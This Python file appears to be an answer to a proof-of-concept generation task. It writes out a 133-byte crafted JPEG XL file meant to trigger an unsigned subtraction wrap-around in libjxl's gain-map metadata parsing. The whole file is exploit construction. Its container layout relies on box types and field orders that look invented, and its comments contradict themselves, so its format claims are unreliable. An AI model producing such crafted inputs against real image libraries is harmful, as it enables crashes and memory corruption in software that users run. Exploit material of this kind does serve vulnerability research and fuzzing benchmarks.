import os
import tarfile
import tempfile
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # This vulnerability is in libjxl (JPEG XL library) from issue 42535447
        # The bug is in decodeGainmapMetadata() where unsigned subtraction causes wrap-around
        # We need to craft a JPEG XL file that triggers this overflow
        
        # The PoC needs to be a valid JPEG XL file with specific metadata
        # Based on the vulnerability, we need to create a file where:
        # 1. It's a valid JPEG XL file header
        # 2. Contains a GainMapMetadata box
        # 3. The box has specific values that cause unsigned wrap-around in subtraction
        
        # JPEG XL file structure:
        # - JXL signature (13 bytes)
        # - Box structure with type and size
        # - GainMapMetadata box with malicious values
        
        # Ground truth length is 133 bytes, so we'll create exactly that
        
        # JXL signature
        signature = b'\x00\x00\x00\x0cJXL \r\n\x87\n'
        
        # First box: JXLF (container)
        # Box size = total file size - 8 (for box header itself)
        # Total will be 133 bytes, so box size = 133 - 8 = 125
        jxlf_header = struct.pack('>I', 125)  # Big-endian 32-bit size
        jxlf_header += b'JXLF'
        
        # Inside JXLF: ftyp box
        ftyp_size = struct.pack('>I', 20)  # Size includes this header
        ftyp_header = ftyp_size + b'ftyp'
        ftyp_data = b'jxl \x00\x00\x00\x00jxl '  # Brand and compatible brands
        
        # Now create the malicious GainMapMetadata box
        # The vulnerability is in decodeGainmapMetadata() where:
        # size_t distance = end - begin; (both unsigned, end < begin causes wrap-around)
        # We need end < begin in the metadata parsing
        
        # Box header: size (4 bytes) + type (4 bytes)
        # Total box size will be 133 - len(so_far) - 8
        
        # Calculate sizes:
        # signature: 12 bytes
        # jxlf_header: 8 bytes
        # ftyp_box: 20 bytes
        # So far: 40 bytes
        
        # Remaining for gainmap box: 133 - 40 = 93 bytes
        # Box header is 8 bytes, so content: 85 bytes
        
        gainmap_size = struct.pack('>I', 93)  # Includes 8-byte header
        gainmap_type = b'GMAP'  # GainMapMetadata box type
        
        # Now craft malicious metadata content
        # We need values that cause unsigned wrap-around
        # The vulnerable code does: size_t distance = end - begin;
        # where begin and end are offsets read from the stream
        
        # We'll create a case where end < begin
        # Let end = 1, begin = 100
        # Then distance = 1 - 100 = huge positive number due to wrap-around
        
        # The metadata format in libjxl:
        # - Various fields, but we need to trigger the specific subtraction
        
        # Based on libjxl source, the vulnerable subtraction is in ParseGainMapMetadata
        # It reads a VarInt for begin and end positions
        
        # We'll create a simple malicious payload:
        # 1. Valid metadata start
        # 2. Malicious begin/end values
        # 3. Rest filled to reach exact 133 bytes
        
        # Start with some valid metadata flags
        metadata_flags = b'\x00'  # Version 0, no extensions
        
        # For the vulnerability, we need the "end" position to be less than "begin"
        # In VarInt encoding, smaller numbers use fewer bytes
        # Let's use:
        # end = 1 (encoded as 0x01)
        # begin = 100 (encoded as 0x64)
        
        # In the actual parsing, these would be read as VarInts
        # We'll encode them directly in the payload
        
        # Create payload that will cause the subtraction overflow
        # The exact byte sequence needed to trigger the bug
        
        # Based on the vulnerability pattern, we need:
        # - A valid start to pass initial checks
        # - Then the malicious values
        
        payload = metadata_flags
        
        # Add padding to reach the vulnerable code path
        # The code expects certain fields before the vulnerable subtraction
        
        # Add some dummy fields first
        # 4-byte dummy value
        payload += b'\x00\x00\x00\x00'
        
        # Now add the malicious values
        # We need end < begin
        # In VarInt encoding, 1 = 0x01, 100 = 0x64
        # But we need to ensure they're parsed in the right order
        
        # Based on libjxl source order: end comes before begin in some cases
        # Let's put end first (smaller value)
        payload += b'\x01'  # VarInt for end = 1
        
        # Then begin (larger value)
        payload += b'\x64'  # VarInt for begin = 100
        
        # Fill remaining space to make total 133 bytes
        # Current sizes:
        # signature: 12
        # jxlf_header: 8
        # ftyp_box: 20
        # gainmap_header: 8
        # payload so far: 1 + 4 + 1 + 1 = 7 bytes
        # Total: 12 + 8 + 20 + 8 + 7 = 55 bytes
        # Need: 133 - 55 = 78 more bytes
        
        # Add padding to reach exact size
        padding = b'\x00' * 78
        
        payload += padding
        
        # Construct final file
        poc = (
            signature +
            jxlf_header +
            ftyp_header +
            ftyp_data +
            gainmap_size +
            gainmap_type +
            payload
        )
        
        # Verify length is exactly 133 bytes
        assert len(poc) == 133, f"Expected 133 bytes, got {len(poc)}"
        
        return poc
